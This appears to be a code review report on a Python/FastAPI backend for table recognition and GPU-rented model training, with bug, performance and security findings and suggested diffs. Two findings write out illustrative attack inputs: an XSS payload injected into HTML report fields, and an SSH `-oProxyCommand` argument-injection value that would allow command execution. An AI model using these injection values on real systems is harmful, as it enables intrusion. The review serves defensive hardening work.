This is an `async def` endpoint performing blocking work on the event loop: `await upload.read()` reads each file fully into memory (no size cap, arbitrary number of files → trivial memory exhaustion / DoS) and `destination.write_bytes(...)` plus `scanmod.register_uploads(...)` perform synchronous disk and DB I/O, stalling every other request. Stream the body to disk in chunks with an enforced size limit (e.g. `upload.file` + `shutil.copyfileobj` inside `run_in_threadpool`, or `await upload.read(chunk)` writes) and run `register_uploads` in a threadpool worker.

Current code:

```
            destination.write_bytes(await upload.read())
```

### `backend/app/api/recognition.py:26`

*bug · high*

The schema default contradicts the authorization rule below: `create_recognition_run` rejects any `stop_policy != "none"` for non-admins, so a request that simply omits the field (e.g. a script/API client, or any caller that doesn't replicate the frontend logic in `RecognizePage.tsx`) gets a 403 instead of a created run. The DB default is also `'none'` (`db.py`), so the API default should match the safe/non-privileged value and admins should opt in explicitly.

```diff
-    stop_policy: Literal["none", "disable_inference"] = "disable_inference"
+    stop_policy: Literal["none", "disable_inference"] = "none"
```

### `backend/app/api/training.py:197`

*bug · high*

`TrainConfig(**cfg_in)` is built outside the `try` block, so malformed client config (e.g. `train_type: "bogus"`, `lora_rank: 0`, wrong types) raises a Pydantic `ValidationError` that no handler converts, and the endpoint answers 500 instead of a clean 400 (the try below only wraps `auto_training.start_auto`). Move the instantiation inside the try or translate `ValidationError` explicitly.

```diff
-    cfg = TrainConfig(**cfg_in).model_dump(exclude_unset=True)
+    try:
+        cfg = TrainConfig(**cfg_in).model_dump(exclude_unset=True)
+    except ValidationError as exc:
+        raise HTTPException(status_code=400, detail=str(exc)) from exc
```

### `backend/app/api/training.py:198-200`

*bug · high*

`vault.get(ref)` validates the name and raises `ValueError("nome secret non valido")` for anything that is not a plain vault name (see `vault._validate_name`). Since `credential_ref` comes straight from the request body, a client sending `{"credential_ref": "vault:bad name!"}` (or any non-matching value) produces an unhandled `ValueError` → 500. The same pattern is repeated in `training_auto_cancel`. Wrap the vault lookup and return 400.

Current code:

```
    ref = str(payload.get("credential_ref") or "vault:vast_api_key").strip()
    api_key = str(payload.get("api_key") or "").strip() or vault.get(ref)
    if not api_key:
```

### `backend/app/api/training.py:305`

*performance · high*

`trainer._status` is fully synchronous: it opens SQLite connections, reads run metadata/log/metrics files from disk and even shells out to `nvidia-smi` (up to 8 s timeout via `gpu_snapshot`, cached only 10 s). Running it directly inside this async generator blocks the event loop for the whole request duration, stalling every other request on the worker while the stream polls every 2 s. Offload it with `await asyncio.to_thread(trainer._status, project_id)`.

```diff
-                st = trainer._status(project_id)  # noqa: SLF001
+                st = await asyncio.to_thread(trainer._status, project_id)
```

### `backend/app/api/users.py:96-97`

*bug · high*

The demotion guard is applied to **every** role change of another user, not only when an admin is being demoted: `_guard_demote`/`count_admins` runs for any `payload.role != target["role"]`, so on a single-admin instance it blocks promoting a `viewer`/`editor` to `editor`/`admin`. The self-guard is also wrong: it blocks an admin from changing their own role even when other admins exist, while its message claims to be about "the last administrator" (that check lives in `_guard_demote`), and an invalid role value falls into the same branch returning 400 instead of the 422 from `validate_role`. Run the guard only when the target is currently an admin and is being demoted (delegating self-demotion to it), and make the message describe the real rule.

```diff
-        if payload.role and payload.role != target["role"] and admin["id"] != target["id"]:
-            _guard_demote(conn, target["id"])
+        demoting_admin = target["role"] == "admin" and payload.role not in (None, "admin")
+        if demoting_admin and admin["id"] != target["id"]:
+            _guard_demote(conn, target["id"])
```

### `backend/app/config.py:136`

*security · high*

`AUTH_MODE` only recognises the literal `on`; `auth_enabled()` returns `AUTH_MODE == "on"`, so any other value — including the very natural `TABULARIUM_AUTH=true` / `1` / `yes` — silently disables authentication for the whole API. A typo in this env var therefore turns a self-hosted, network-exposed instance into an unauthenticated one. Validate the value explicitly and fail fast on anything that is not `on`/`off` instead of defaulting to "auth disabled". (`SESSION_COOKIE_SECURE` below has the mirror-image problem: `"false"` is truthy, so it fails safe, but the parsing should be normalised too.)

```diff
-AUTH_MODE = os.environ.get("TABULARIUM_AUTH", "on").strip().lower()
+_auth_env = os.environ.get("TABULARIUM_AUTH", "on").strip().lower()
+if _auth_env not in {"on", "off"}:
+    raise RuntimeError(f"TABULARIUM_AUTH={_auth_env!r}: use 'on' or 'off'")
+AUTH_MODE = _auth_env
```

### `backend/app/config.py:178`

*security · high*

This treats every non-`"0"` string as truthy, so `TABULARIUM_REGISTRATION_OPEN=false` / `no` / `off` unexpectedly *opens* registration on a self-hosted instance. Parse an explicit allow-list of truthy values instead (`"1"`, `"true"`, `"yes"`, `"on"`).

```diff
-REGISTRATION_OPEN = os.environ.get("TABULARIUM_REGISTRATION_OPEN", "0").strip() != "0"
+REGISTRATION_OPEN = os.environ.get("TABULARIUM_REGISTRATION_OPEN", "0").strip().lower() in {
+    "1", "true", "yes", "on"
+}
```

### `backend/app/db.py:491-494`

*bug · high*

`executescript` does not wrap the statements in a transaction (each statement autocommits), so a migration is not atomic: an error after `DROP TABLE projects` / `DROP TABLE compute_profiles` leaves the database permanently damaged while `schema_version` still points to the previous migration. Retrying cannot recover either, because the helper tables are created without `IF NOT EXISTS` (`CREATE TABLE projects_owner_fk_new`, `CREATE TABLE compute_profiles_v20`) and will fail with "table already exists" on the next startup. Run each migration inside an explicit transaction (`BEGIN`/`COMMIT` in the script, or `conn.execute` per statement inside a transaction) so a failed migration rolls back completely; note that `PRAGMA foreign_keys` cannot be toggled from inside such a transaction, so it has to be set on the connection outside of it.

Current code:

```
        if version in {"16", "17", "18"}:
            _execute_additive_migration(conn, ddl)
        else:
            conn.executescript(ddl)
```

### `backend/app/domain/otsl.py:221-224`

*bug · high*

`handle_endtag` ignores `table_depth`: for a nested table inside an outer `<td>`, the nested `</tr>` sets `current_row = None` and the nested `</td>` clears `current_cell`. Result: the outer cell text after the nested table is dropped, and every following outer `<td>`/`<th>` is skipped because `current_row is None` (see the `current_row is not None` guard in `handle_starttag`). Rowspans coming from the outer table are then lost/misaligned.

```diff
-        if tag in {"td", "th"}:
-            self.current_cell = None
-        elif tag == "tr":
-            self.current_row = None
+        if tag == "table":
+            self.table_depth = max(0, self.table_depth - 1)
+            if self.table_depth == 0:
+                self.current_row = None
+                self.current_cell = None
+            return
+        if self.table_depth != 1:
+            return
+        if tag in {"td", "th"}:
+            self.current_cell = None
+        elif tag == "tr":
+            self.current_row = None
```

### `backend/app/domain/table_headers.py:38`

*bug · high*

The header/body boundary is hard-coded to two rows and nothing verifies that row 2 is not itself a header row, contradicting the module contract (“una griglia … di forma diversa non viene mai toccata”).

On a flattened **three**-level header (row 0 = `COUNTRIES. | 1908-1909. | 1909-1910.`, row 1 = `Merch. | Treas. | Total | …`, row 2 = a further sub-label row) every guard still passes: `leaves` comes from row 1, which is non-numeric and repeats with period 3, `groups` matches `row0`, and `n == len(leaves)`. The function therefore rewrites the header as two levels and leaves the row-2 label cells untouched in the body (`cells if c["r"] >= 2`), producing a table whose first data row is nothing but header fragments — a silent corruption rather than a fail-closed return.

Add a check that the first preserved body row actually looks like data before rebuilding (or, symmetrically, that row 1 + row 2 do not both look like label rows).

```diff
-    head = [c for c in cells if c["r"] < 2]
+    # Senza una garanzia a monte sulle righe di intestazione, una terza riga
+    # di etichette finirebbe nel corpo: se la prima riga "dati" non contiene
+    # nemmeno un numero, la forma non è quella a due livelli e non si tocca.
+    first_body = [
+        (c["text"] or "").strip()
+        for c in cells
+        if c["r"] == 2 and (c["text"] or "").strip()
+    ]
+    if first_body and not any(_NUMBER.match(t) for t in first_body):
+        return grid
+    head = [c for c in cells if c["r"] < 2]
```

### `backend/app/domain/table_similarity.py:35-37`

*bug · high*

Malformed grid handling crashes evaluation instead of degrading gracefully:
- `grid.get('cells', [])` returns `None` when the key exists but is null, so `sorted(None, ...)` raises `TypeError`.
- `c['r']` / `c['c']` raise `KeyError` when a cell lacks those keys.
- The raw values are sorted *before* being converted with `int()`, so string/int mixtures raise `TypeError` and string indices are ordered lexicographically (`'10' < '9'`), silently mis-ordering children for the OTSL/TEDS comparison.

Normalize once with `.get(...)` + `int(...)` before sorting.

```diff
-    rows = [TableNode('tr') for _ in range(int(grid.get('rows') or 0))]
-    nodes = len(rows)
-    for cell in sorted(grid.get('cells', []), key=lambda c: (c['r'], c['c'])):
+    rows = [TableNode('tr') for _ in range(max(0, int(grid.get('rows') or 0)))]
+    nodes = len(rows)
+    def _key(cell):
+        return int(cell.get('r') or 0), int(cell.get('c') or 0)
+    for cell in sorted(grid.get('cells') or [], key=_key):
```

### `backend/app/domain/table_similarity.py:38-39`

*bug · high*

Cells whose row index is outside the declared row count are silently dropped. When `rows` is missing, zero or negative, *every* cell is discarded and the resulting tree contains no cells at all: two completely different malformed grids then compare equal and `teds` returns a false perfect score of 1.0. At minimum this should be visible (log/raise) or the grid row count should be derived from the cells, so that data bugs in the prediction do not silently inflate the metric.

```diff
-        r = int(cell['r'])
-        if 0 <= r < len(rows):
+        r = int(cell['r'])
+        if 0 <= r < len(rows):
```

### `backend/app/domain/vram.py:194-201`

*bug · high*

The bisection is off by a grid step and can both skip fitting candidates and test points above the upper bound. `high` starts as an *inclusive* upper bound and `middle` is chosen relative to it, but `high = middle - 256` drops one whole grid value: with `low=512`, `high=640`, `middle=(512+640+256)//2 = 704` (larger than `high`, and untested by the invariant), so a failing 704 sets `high=448` and the function returns 512 even though 640 fits. Same failure with aligned bounds: `low=512, high=1024`, boundary at 640 → 896 fails, `high=640`, then 704 fails, `high=448` → returns 512. The final `(low // 256) * 256` also returns a non-tested value when `max_length` is not a multiple of 256, and can exceed the configured `max_length` (e.g. `max_length=300` → `high=512` → suggests 512). Suggest bisecting over grid indices and reusing `fits()` instead of duplicating the headroom check.

```diff
-    while low < high:
-        middle = (low + high + 256) // 2
-        probe["max_length"] = middle
-        if estimate(probe, model_path=model_path, architecture=architecture).total_mib * _HEADROOM <= free_mib:
-            low = middle
-        else:
-            high = middle - 256
-    return (low // 256) * 256
+    ceiling = max(512, int(cfg.get("max_length", 16384) or 16384))
+    steps = ceiling // 256
+    probe["max_length"] = 256
+    if not fits(estimate(probe, model_path=model_path, architecture=architecture).total_mib, free_mib):
+        return 0
+    low, high, best = 1, steps, 1
+    while low <= high:
+        middle = (low + high) // 2
+        probe["max_length"] = middle * 256
+        if fits(estimate(probe, model_path=model_path, architecture=architecture).total_mib, free_mib):
+            best = middle
+            low = middle + 1
+        else:
+            high = middle - 1
+    return best * 256
```

### `backend/app/main.py:84`

*bug · high*

The handler rebuilds the response from status code and body only, silently dropping `exc.headers`. Starlette's default handler forwards them, so returning a 401 without `WWW-Authenticate` (or a 405 without `Allow`, etc.) changes the protocol semantics for clients and breaks any endpoint that raises `HTTPException(..., headers={...})`.

```diff
-    return JSONResponse(status_code=exc.status_code, content={"detail": detail})
+    return JSONResponse(
+        status_code=exc.status_code,
+        content={"detail": detail},
+        headers=getattr(exc, "headers", None),
+    )
```

### `backend/app/services/annotation_schema.py:68-71`

*bug · high*

`validate_page` is documented to *return* semantic errors, but it crashes on malformed geometry instead. `region.geometry` comes straight from `json.loads(points)` in `from_records`, so a flat coordinate list (`[1,2,3,4]`), a `null`/dict payload, or a point that is a number rather than a list makes `len(point)` / `point[:2]` raise `TypeError`/`IndexError`. The validator must tolerate any shape it is given (it is the last line of defence before exporting), and a polygon also needs at least 3 points, not 2. Note also `bool` is a subclass of `int`, so `True`/`False` currently pass as coordinates.

```diff
-        if len(region.geometry) < 2:
-            errors.append(f"regione {region.id}: geometria insufficiente")
-        for point in region.geometry:
-            if len(point) < 2 or not all(isinstance(v, (int, float)) for v in point[:2]):
+        geometry = region.geometry
+        if not isinstance(geometry, list) or len(geometry) < 3:
+            errors.append(f"regione {region.id}: geometria insufficiente")
+            continue
+        for point in geometry:
+            if not isinstance(point, (list, tuple)) or len(point) < 2:
+                errors.append(f"regione {region.id}: coordinate non valide")
+                continue
+            if not all(isinstance(v, (int, float)) and not isinstance(v, bool) for v in point[:2]):
```

### `backend/app/services/artifacts.py:20-23`

*bug · high*

If `root` does not exist (or is not a directory) an empty manifest is written silently. `verify_manifest` then reports `{"ok": True, "checked": 0}` on that empty manifest, so a run whose artifacts directory was never produced is recorded as successfully verified (see `trainer._monitor`, which stores this result in `meta["artifacts"]`). Fail loudly instead of writing an empty manifest.

```diff
-    lines = []
-    if root.is_dir():
-        for path in sorted(p for p in root.rglob("*") if p.is_file()):
-            lines.append(f"{sha256(path)}  {path.relative_to(root).as_posix()}\n")
+    if not root.is_dir():
+        raise FileNotFoundError(f"cartella artefatti assente: {root}")
+    lines = [
+        f"{sha256(path)}  {path.relative_to(root).as_posix()}\n"
+        for path in sorted(p for p in root.rglob("*") if p.is_file())
+    ]
```

### `backend/app/services/artifacts.py:33`

*bug · high*

These calls can raise outside the documented `{ok, checked, errors}` contract: `read_text` raises `UnicodeDecodeError` on a corrupt/binary manifest (and `OSError`/`FileNotFoundError` if the manifest disappears between `is_file()` and the read), and `sha256(path)` raises `OSError` on permission errors or if the file is deleted after the `is_file()` check. The main caller (`trainer._monitor`) invokes `verify_manifest` outside any try/except, so a single I/O hiccup aborts artifact finalization instead of being reported as a verification error. Wrap the reads/hashing in `try/except OSError` (and handle `UnicodeDecodeError`) and append to `errors`.

Current code:

```
    for line in manifest_path.read_text(encoding="utf-8").splitlines():
```

### `backend/app/services/auto_training.py:328`

*bug · high*

The admission check (`_active_for_project`) and the job-id/save/thread registration below are not atomic, and the id is derived from a millisecond clock. Two concurrent `start_auto` calls for the same (or different) projects can both pass the check (renting two GPUs), and two calls within the same millisecond generate the same `auto_<ts>` id, so the second `_save` overwrites the first job file and `_CANCEL`/`_THREADS` keys collide (the first cancel event becomes unreachable). Hold `_LOCK` across check → id generation → save → thread registration, and make the id unique (e.g. `uuid4().hex[:12]` or a monotonic counter).

Current code:

```
    job_id = f"auto_{int(time.time() * 1000)}"
```

### `backend/app/services/auto_training.py:363`

*bug · high*

`cancel_auto` loads its own copy of the job while the worker thread keeps mutating a different in-memory dict; each `_update` rewrites the whole file via `os.replace`, so the last writer wins. A worker `_update(...)` after this function returns will overwrite `state='cancelled'` and drop `instance_destroyed`, and conversely this function can overwrite `instance_id`/`run_id` written concurrently by the worker (possibly leaking a GPU that was just rented). Also `_destroy`/`trainer.stop_run` failures are silently swallowed (`except Exception: pass` / raising out of the handler leaves the job not cancelled). Guard job read-modify-write with `_LOCK` and merge patches instead of replacing full documents.

Current code:

```
def cancel_auto(job_id: str, api_key: str = "") -> dict:
```

### `backend/app/services/auto_training.py:438-440`

*bug · high*

The terminal `finished` state (and the `pstate == 'failed'` branch right below) is persisted *before* `_destroy`. Since `_destroy` raises `RuntimeError` when deletion cannot be confirmed, that exception propagates out of `_monitor_run` into `_run`'s broad handler, which rewrites the job as `state='failed', phase='failed'` — a successfully prepared and registered model ends up reported as a failed job, and `instance_destroyed` is never recorded. Persist the terminal state only after cleanup, or catch the deletion failure and keep the success state while recording the cleanup problem separately.

Current code:

```
                    model_id=prepare.get("model_id"),
                )
                _destroy(api_key, instance_id)
```

### `backend/app/services/auto_training.py:726`

*bug · high*

When `run_id` is falsy (both `started['run']['run_id']` and the `list_runs` fallback returned nothing) the job is still persisted as `running`/`training` but `_monitor_run` is never entered. The rented instance is therefore never destroyed and the job sits in `running` forever, which also blocks any new auto-training for the project via `_active_for_project`. Fail explicitly in this branch (after destroying the instance) instead of silently leaving an orphaned rental.

Current code:

```
        if run_id and instance_id is not None:
```

### `backend/app/services/backup.py:67`

*bug · high*

The restore overwrites the live database in place via the backup API. If the copy fails mid-way (SQLITE_BUSY from a concurrent writer, disk full, crash) the production DB is left partially overwritten with no rollback path, and the caller only gets a 400 for an already-corrupted database. Also, if `sqlite3.connect(candidate)` succeeded but this line raises, the source connection leaks (the `try/finally` starts below it). Prefer writing to `DB_PATH.with_suffix('.restore-tmp')` and atomically `os.replace()`-ing it into place (after closing all live connections), keeping the pre-restore file for rollback on failure.

```diff
-    dest = sqlite3.connect(config.DB_PATH)
+    with contextlib.closing(sqlite3.connect(candidate)) as source, contextlib.closing(sqlite3.connect(config.DB_PATH)) as dest:
```

### `backend/app/services/backup.py:74`

*bug · high*

The post-restore integrity result is returned but never enforced: if the restored DB fails `integrity_check` (or `journal_mode` came back wrong), the caller still reports the restore as successful (`ok: False` buried in the payload). After a write that must be all-or-nothing this should raise/roll back, so the `pre-restore` backup can be used instead of silently running on a damaged DB.

```diff
-    return {"restored": candidate.name, **integrity()}
+    check = integrity()
+    if not check["ok"]:
+        raise RuntimeError("ripristino non integro: usare il pre-backup")
+    return {"restored": candidate.name, **check}
```

### `backend/app/services/benchmark.py:64`

*bug · high*

The cache key only covers adapter/model/page/revision, but the cached payload (`res`) depends on the evaluation options too: `evmod._evaluate_page` returns empty `text`/`tables` when `with_text=False`, filters ground truth to `Table` when `table_only=True`, and the produced transcripts depend on `table_hint`/`schema_labels`. Reusing a cache entry across runs with different flags therefore returns silently wrong aggregates (e.g. run without text, then rerun with text → all text metrics are empty even though `with_text=True`). Either include these options in the key or skip the cache when they differ.

```diff
-    key = f"v{_CACHE_VERSION}__{_slug(target['adapter_id'])}__{_slug(target['model'])}__{page_id}__{revision}.json"
+    # `with_text` / `table_only` / `table_hint` / `schema_labels` cambiano il
+    # contenuto del risultato: vanno nella chiave o la cache restituisce
+    # aggregati sbagliati da una run con opzioni diverse.
+    key = (
+        f"v{_CACHE_VERSION}__{_slug(target['adapter_id'])}__{_slug(target['model'])}"
+        f"__{page_id}__{revision}.json"
+    )
```

### `backend/app/services/benchmark.py:402`

*security · high*

`adapter_id` and `model` come straight from the user-supplied target dicts and are interpolated into the HTML without escaping. A target such as `{"model": "<img src=x onerror=...>"}` produces stored markup/script execution when `report.html` is opened in a browser. Escape the dynamic values (e.g. `html.escape`) before embedding them.

```diff
-            f"<td>{rank}</td><td>{entry['adapter_id']}</td><td>{entry['model']}</td>"
+            f"<td>{rank}</td><td>{html.escape(str(entry['adapter_id']))}</td>"
+            f"<td>{html.escape(str(entry['model']))}</td>"
```

### `backend/app/services/benchmark.py:532-538`

*security · high*

The PID read back from `bench_state.json` is used for `SIGKILL` without any verification that it still belongs to the benchmark server. After a backend crash/restart the PID may have been recycled by an unrelated process, and killing it is destructive. The same code path exists in `reconcile_benchmarks`. Verify the process (e.g. match its command line against the recorded serve argv) before killing, or record a start time and compare it.

Additionally the corrected state (`serve_pid=None`) is only applied to the in-memory dict and never persisted, contrary to the comment: every subsequent status poll re-attempts the kill against the stale PID.

```diff
-        pid = state.get("serve_pid")
-        if isinstance(pid, int):
-            try:
-                os.kill(pid, signal.SIGKILL)
-            except (ProcessLookupError, PermissionError, OSError):
-                pass
-        state["state"] = "error"
+        pid = state.get("serve_pid")
+        if isinstance(pid, int) and _looks_like_bench_serve(state):
+            try:
+                os.kill(pid, signal.SIGKILL)
+            except (ProcessLookupError, PermissionError, OSError):
+                pass
+        state["state"] = "error"
```

### `backend/app/services/checkpoint_prepare.py:110-114`

*bug · high*

Check-then-act race on `run.json`. `_job_status` is called both from the API polling endpoint (without `_LOCK`) and from `start_prepare` while holding `_LOCK`. Here the `prepare_job` state is inspected and then the *whole* `meta` snapshot (loaded before the check) is written back outside the lock. A concurrent `start_prepare` can set `prepare_job` to the new `running` job in between, and this older snapshot silently overwrites it with `failed` (and can also clobber other fields updated meanwhile). Perform the stale-job recovery under `_LOCK`, re-reading the metadata inside the critical section and writing only after re-validating the state.

```diff
-    if job.get("state") == "running" and not (key in _THREADS and _THREADS[key].is_alive()):
-        job["state"] = "failed"
-        job["error"] = "preparazione interrotta dal riavvio del backend"
-        job["ended_at"] = _now()
-        _save(run_dir, meta, job)
+    with _LOCK:
+        run_dir, meta = _load(project_id, run_id)
+        job = dict(meta.get("prepare_job") or {})
+        key = _key(project_id, run_id)
+        if job.get("state") == "running" and not (key in _THREADS and _THREADS[key].is_alive()):
+            job["state"] = "failed"
+            job["error"] = "preparazione interrotta dal riavvio del backend"
+            job["ended_at"] = _now()
+            _save(run_dir, meta, job)
```

### `backend/app/services/checkpoint_prepare.py:465-467`

*other · high*

Cleanup is performed after the model has already been registered, but the SSH call is unguarded. `executor.run` uses `subprocess.run(..., timeout=...)`, so a dropped connection (`OSError`/`CalledProcessError`-free but `TimeoutExpired`) propagates out of `_prepare_remote`; `_run_job` then either fails the whole job (model is valid but reported as failed) or, if the local toolchain is available, reruns a *local* merge and registration for an already registered run. Wrap the cleanup in `try/except` and only log a warning; the remote leftovers can be removed best-effort.

```diff
-    # Il merged remoto è solo un passaggio: l'adapter resta per riprovare.
-    executor.run(f"rm -rf {shlex.quote(remote_run + '/' + actual_rel)}", timeout=60)
-    return model
+    # Il merged remoto è solo un passaggio: l'adapter resta per riprovare.
+    try:
+        executor.run(f"rm -rf {shlex.quote(remote_run + '/' + actual_rel)}", timeout=60)
+    except (OSError, subprocess.TimeoutExpired) as exc:
+        _append(run_dir, f"!! pulizia remota non riuscita (ignorata): {exc}")
+    return model
```

### `backend/app/services/cloud_manager.py:249-250`

*security · high*

`user` is never validated here (unlike `_ssh_base_args`, which enforces `_SSH_USER`). It comes straight from the HTTP payload, and `ssh` parses any argument starting with `-` as an option even after the other flags: `user="-oProxyCommand=<cmd>"` turns `target` into `-oProxyCommand=<cmd>@host`, i.e. arbitrary command execution as the backend user. Validate `user` with `_SSH_USER` (and `host` with `_HOSTNAME`) before building `target`, or reuse `_ssh_base_args`.

Current code:

```
    if key_path and Path(key_path).expanduser().exists():
        cmd.extend(["-i", str(Path(key_path).expanduser())])
```

### `backend/app/services/cloud_manager.py:587-590`

*bug · high*

Both the offer search and the instance listing re-raise `VastDeprecatedEndpoint` instead of falling back: `search_vast_offers` turns a 410 on `/search/asks/` into a hard failure, so offer search stops working as soon as Vast retires that route (contradicting the comment right above it and `VastDeprecatedEndpoint`'s own contract), and the instances helper does the same, making the documented v0 fallback in the sibling `except RuntimeError` branch unreachable in exactly the case it was written for (an account not yet migrated). Catch `VastDeprecatedEndpoint` in the fallback handler — re-raising only when some pages were already collected — and drop the explicit re-raise.

Current code:

```
    try:
        data = _vast_call(api_key, "PUT", "/search/asks/", json_body={"q": query}, timeout=20.0)
    except VastDeprecatedEndpoint:
        raise
```

### `backend/app/services/cloud_manager.py:939`

*bug · high*

The pair is only regenerated when the **public** file is missing. If `.pub` exists while the private key was deleted/moved, `local_ssh_key(create=True)` reports `exists=True`, `ensure_vast_ssh_key` registers a public key that can never authenticate, and `start_ssh_tunnel`/`_ssh_base_args` skip the `-i` argument (private key absent) and silently fall back to the user's unrelated keys. Check both files: `if create and not (key_path.exists() and pub_path.exists()):` before regenerating.

Current code:

```
    if not pub_path.exists() and create:
```

### `backend/app/services/compute_profiles.py:113-117`

*bug · high*

`mark_unhealthy` runs on `conn` inside the `with connect()` block and the following `raise` propagates out of that block. `db.connect()` returns a raw `sqlite3.Connection`, whose context manager **rolls back** (does not commit) when the block exits with an exception. The health-check failure is therefore never persisted: the UI keeps showing `last_health_check = NULL` and no `last_health_error`, and the diagnosis of a failed activation is lost. Record the failure on a separate connection (or move the whole health check outside the transaction) before raising.

```diff
-        if not health.get("ok"):
-            profilestore.mark_unhealthy(
-                profile_id, at=now, error=health.get("error", "health check fallito"), conn=conn
-            )
-            raise HTTPException(status_code=409, detail={"message": "profilo non attivato: health check fallito", "health": health})
+        if not health.get("ok"):
+            # `with connect()` annulla la transazione sull'eccezione: l'esito va
+            # registrato su una connessione separata prima di uscire dal blocco.
+            with connect() as own:
+                profilestore.mark_unhealthy(
+                    profile_id, at=now, error=health.get("error", "health check fallito"), conn=own
+                )
+            raise HTTPException(status_code=409, detail={"message": "profilo non attivato: health check fallito", "health": health})
```

### `backend/app/services/dataset_builder.py:142-144`

*bug · high*

The points are unpacked here without validating the element shape: `parse_points` only guarantees that the top level is a list. A block whose `points` is e.g. `[[1,2],[3]]` (short element), `[{"x":1,"y":2}]` (dict) or `["12"]` raises `IndexError`/`KeyError`/`TypeError` **before** the `try` that wraps `crop_block_jpeg`, so one malformed annotation aborts the whole dataset build instead of being reported as a warning (which is what layout does for its own blocks). Guard the flattening with the same try/except used for `_normalize_bbox`.

```diff
-    xs = [float(p[0]) for p in points]
-    ys = [float(p[1]) for p in points]
-    bbox = (int(min(xs)), int(min(ys)), int(max(xs)), int(max(ys)))
+    try:
+        xs = [float(p[0]) for p in points]
+        ys = [float(p[1]) for p in points]
+        bbox = (int(min(xs)), int(min(ys)), int(max(xs)), int(max(ys)))
+    except (TypeError, ValueError, KeyError, IndexError) as exc:
+        warnings.append(msg("bbox_invalid", lang, id=block_id, exc=exc))
+        return ""
```

### `backend/app/services/dewarp.py:77-79`

*bug · high*

`align_page` mutates the module-level `_last_engine`/`_last_diagnostics` and invokes `monkey_preprocess.preprocess` **without** `_transform_lock`, while `run_transform` deliberately serializes on that lock (its own docstring says the diagnostics are global and the preprocessor is a single subprocess). Two consequences: (a) concurrent `/align` requests (FastAPI sync endpoints run in a threadpool) interleave `_last_diagnostics`/`_last_engine`, and `pages.py` reads `dewarp.last_engine()`/`dewarp.last_diagnostics()` *after* `align_page` returns, so a request can persist engine/diagnostics belonging to another page; (b) several preprocessor subprocesses (CPU/GPU heavy, up to a 600 s timeout) can run in parallel, exactly the contention the lock exists to prevent. Wrap the body in `with _transform_lock:` (or reuse a `_align_page_locked` helper) so both entry points share the same serialization, and ideally return the diagnostics instead of having callers re-read the globals.

Current code:

```
    _last_diagnostics = {"requested_level": level}
    strength = max(0.0, min(float(strength), 2.0))
    if level in LEVELS and level != "basic" and strength > 0:
```

### `backend/app/services/doctor.py:131-132`

*bug · high*

The probe socket is hard-coded to `AF_INET`, yet the code explicitly handles the IPv6 wildcard `"::"` and the CLI accepts any `--host`/`TABULARIUM_HOST`. Consequences: (1) `host="::"` is bound as IPv4 `""` (0.0.0.0), so a listener on `[::]:8787` is not detected; (2) an IPv6 literal such as `--host ::1` makes `bind()` raise `socket.gaierror`, which is reported as `FAIL "non disponibile"` even though the port is free (false blocking verdict). Resolve the address family/host via `getaddrinfo` and build the socket accordingly.

```diff
-def check_port(host: str, port: int) -> Check:
-    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+def check_port(host: str, port: int) -> Check:
+    wildcard = host in {"", "0.0.0.0", "::"}
+    try:
+        family, _, _, _, sockaddr = socket.getaddrinfo(
+            None if wildcard else host, port, type=socket.SOCK_STREAM,
+            flags=socket.AI_PASSIVE if wildcard else 0,
+        )[0]
+    except socket.gaierror as exc:
+        return _check("port", WARN, f"{host} non risolvibile ({exc})")
+    probe = socket.socket(family, socket.SOCK_STREAM)
```

### `backend/app/services/evaluate.py:198-203`

*bug · high*

`structure_ok` can be `True` even when the cell layout differs. The `len(...) == len(...)` check plus the `if k in pred_cells` filter means a GT cell key missing from the prediction is silently skipped, so a prediction that has the same number of cells but at different `(r, c)` positions (e.g. GT `(1,2)` vs pred `(2,1)`) passes as structurally identical. The same filter also hides those cells from `cell_cer`, which then only averages the shared cells and under-reports the error. Compare the key sets explicitly.

```diff
-            and all(
-                gt_cells[k].get("rowspan") == pred_cells[k].get("rowspan")
-                and gt_cells[k].get("colspan") == pred_cells[k].get("colspan")
-                for k in gt_cells
-                if k in pred_cells
-            )
+            and set(gt_cells) == set(pred_cells)
+            and all(
+                int(gt_cells[k].get("rowspan") or 1) == int(pred_cells[k].get("rowspan") or 1)
+                and int(gt_cells[k].get("colspan") or 1) == int(pred_cells[k].get("colspan") or 1)
+                for k in gt_cells
+                if k in pred_cells
+            )
```

### `backend/app/services/export_formats.py:104-105`

*bug · high*

The ALTO branch emits an empty `TextLine` and never writes `block["content"]`, so text is silently lost for every region in ALTO exports (PAGE preserves it via `String/@CONTENT`). Emit a `String` element and set its `CONTENT` attribute (ALTO requires `String` inside `TextLine`), e.g. `SubElement(SubElement(region, "TextLine"), "String", {"CONTENT": str(block["content"])})`. Note also that `attrs` built above is unused in this branch.

Current code:

```
                    if block["content"]:
                        SubElement(region, "TextLine")
```

### `backend/app/services/huggingface_auth.py:89-90`

*bug · high*

`status()` unconditionally rewrites the state to `connected` (and clears `error`) whenever `get_token()` returns a token, which masks the outcome of the operation that just ran. After a failed `connect()` the caller still receives `state='connected', error: None` when `HF_TOKEN` is set in the environment or `login()` partially wrote a token before raising, so the UI reports success; after `disconnect()` the same recomputation reports `connected` because `get_token()` still resolves `HF_TOKEN` (higher priority than the cache entry `logout()` cleared), so the documented 'downloads go back to public models only' behaviour is not achieved. Return the operation's own result instead of recomputing it via `status()`, and detect the `HF_TOKEN` case explicitly with an error/`needs_token` state.

```diff
-        _set(state="error", error=str(exc), verification_uri_complete=None, user_code=None)
-        return status()
+        _set(state="error", error=str(exc), verification_uri_complete=None, user_code=None)
+        with _lock:
+            result = dict(_state)
+        result["token_page"] = TOKEN_PAGE
+        return result
```

### `backend/app/services/i18n.py:632-636`

*bug · high*

`_COMPILED` follows `_IT` insertion order, so the generic `table_error` template ("blocco {id} (Table): {exc}") is compiled and tried **before** the more specific table messages (`table_band_failed`, `table_band_no_boundaries`, `table_unverified_cells`, `table_unverified_skip`). Any detail such as "blocco 3 (Table): generazione banda fallita (…)" therefore matches `table_error` first and `localize_detail` returns "block 3 (Table): generazione banda fallita (…)" — a translated wrapper with untranslated Italian left inside `{exc}` — and the specific keys are effectively unreachable. Order the patterns by specificity (longest literal text first) so generic templates only act as a last resort.

```diff
-_COMPILED: list[tuple[str, re.Pattern[str]]] = [
-    (code, pat)
-    for code, template in _IT.items()
-    if (pat := _template_pattern(template)) is not None
-]
+_COMPILED: list[tuple[str, re.Pattern[str]]] = sorted(
+    (
+        (code, pattern)
+        for code, template in _IT.items()
+        if (pattern := _template_pattern(template)) is not None
+    ),
+    # piu` testo letterale = piu` specifico: i template generici vanno per ultimi
+    key=lambda entry: len(_IT[entry[0]]),
+    reverse=True,
+)
```

